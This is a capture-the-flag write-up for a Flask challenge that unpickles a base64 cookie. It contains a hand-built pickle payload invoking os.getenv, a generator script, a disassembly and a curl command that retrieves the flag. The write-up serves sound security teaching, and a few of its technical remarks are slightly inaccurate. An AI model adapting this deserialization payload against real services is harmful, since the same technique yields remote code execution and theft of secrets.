## Reckon
Due to the existence of the `pickle` module in the [source code](./src/jar.py) it's obviously a pickle RCE (remote code execution) challenge. In it's most basic form a malicious pickle bytecode is crafted to make the server-side load the `sys.system` module, which allows running shell commands.

Here, we'll do something even simpler: read an environment variable. The `FLAG` envvar was defined in the Dockerfile:  
`ENV FLAG="actf{REDACTED}"`  

The web application itself is very simple, just a form with a text input named `item`, a cookie named `contents` and two (relevant) routes. On either routes the app will check for a cookie named `contents`; if it was not present in the request, `item` is an empty list, otherwise it receives the result of `pickle.loads()` applied to base64-decoded `contents`.

```python
@app.route('/')
def jar():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []

[...]

@app.route('/add', methods=['POST'])
def add():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
```
Each `pickle.loads()` call is a possible entrypoint for the payload.


## The Payload
The payload must be a base64-encoded pickled bytestream that executes something equivalent to

`import os; os.getenv("FLAG")`

The pickle serialization model is a very simple VM that understands opcodes and arguments. It builds a stack from these opcodes and returns it's topmost item. One of it's opcodes is called `GLOBAL` and  it calls a Python callable object (one that implements `__call__`, being a class or a function) and a tuple containing the arguments to the callable.   

`GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args` ([source code](https://github.com/python/cpython/blob/0af99b44edf559305def22b2d68be685ce50d7f6/Lib/pickle.py#L133))

In this case we'll use the `getenv` callable from the `sys` module with the string `"FLAG"` as argument. The stack's topmost item would be translated to something like this:  
`self.find_class(os.getenv, ("FLAG",))`

The final bytecode is built like this:
```
p  = b'('               # create mark 1
p += b'c'               # push self.find_class(modname, name); 2 string args
p += b'os\n'            # arg1
p += b'getenv\n'        # arg2
p += b'('               # create mark 2
p += b'S"FLAG"\n'       # push string
p += b't'               # build tuple from stack items until mark 2
p += b'R'               # apply callable to argtuple, both on stack
p += b'l'               # build a list from items until mark 1
p += b'.'               # stop
```

A step-by-step explanation on how the stack is built:

  | 1  | 2  | 3  | 4      | 5      | 6         | 7         | 8                       | 9                         |
  | -  | -  | -  | -      | -      | -         | -         | -                       | -                         |
  | -  | -  | -  | -      | -      | "FLAG"    | -         | -                       | -                         |
  | -  | -  | -  | -      | *2     | *2        | ("FLAG",) | -                       | -                         |
  | -  | -  | -  | getenv | getenv | getenv    | getenv    | -                       | -                         |
  | -  | c  | os | os     | os     | os        | os        | c(os.getenv, ("FLAG",)) | -                         |
  | *1 | *1 | *1 | *1     | *1     | *1        | *1        | *1                      | [c(os.getenv, ("FLAG",))] |


1) `b'('`: Create mark 1 on the stack  
2) `b'c'`: Push the GLOBAL opcode  
3) `b'os\n'`: Push the "os" argument to GLOBAL  
4) `b'getenv\n'`: Push the "getenv" argument to GLOBAL  
5) `b'('`: Create mark 2 on the stack  
6) `b'S"FLAG"\n'`: Push the argument string  
7) `b't'`: Build tuple from stack items, until mark 2  
8) `b'R'`: Apply callable to argtuple (REDUCE), both on stack  
9) `b'l'`: Build a list from items until mark 1  

The payload generator code:

```bash
#!/usr/bin/python3
import codecs
import base64
import pickletools

p  = b'('               # create mark
p += b'c'               # push self.find_class(modname, name); 2 string args
p += b'os\n'            # arg1
p += b'getenv\n'        # arg2
p += b'('               # create mark
p += b'S"FLAG"\n' # push string
p += b't'               # build tuple
p += b'R'               # apply callable to argtuple, both on stack
p += b'l'
p += b'.'               # stop

pickle_encoded = codecs.encode(p, 'base64').replace(b'\n', b'')

pickletools.dis(base64.b64decode(pickle_encoded), annotate=1)
print("Payload: " + bytes.decode(pickle_encoded))
```

Output:
```
$ ./jar_payload.py
    0: (    MARK Push markobject onto the stack.
    1: c        GLOBAL     'os getenv' Push a global object (module.attr) on the stack.
   12: (        MARK                   Push markobject onto the stack.
   13: S            STRING     'FLAG'  Push a Python string object.
   21: t            TUPLE      (MARK at 12) Build a tuple out of the topmost stack slice, after markobject.
   22: R        REDUCE                      Push an object built from a callable and an argument tuple.
   23: l        LIST       (MARK at 0)      Build a list out of the topmost stack slice, after markobject.
   24: .    STOP                            Stop the unpickling machine.
highest protocol among opcodes = 0
Payload: KGNvcwpnZXRlbnYKKFMiRkxBRyIKdFJsLg==

```

Aaaaaand:
```
$ curl --cookie "contents=KGNvcwpnZXRlbnYKKFMiRkxBRyIKdFJsLg==" https://jar.2021.chall.actf.co/
<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg"><div style="background-color: white; font-size: 3em; position: absolute; top: 87.7274822057462%; left: 66.32665379876163%;">actf{you_got_yourself_out_of_a_pickle}</div>
```

`actf{you_got_yourself_out_of_a_pickle}`
